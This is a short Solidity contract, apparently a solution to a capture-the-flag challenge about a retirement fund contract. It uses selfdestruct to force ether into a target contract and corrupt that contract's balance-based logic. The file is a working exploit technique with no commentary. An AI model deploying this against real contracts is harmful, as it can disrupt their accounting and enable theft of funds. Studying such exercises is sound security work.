// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RetirementFundAttack {
    function destroy(address payable target) external payable {
        selfdestruct(target);
    }
}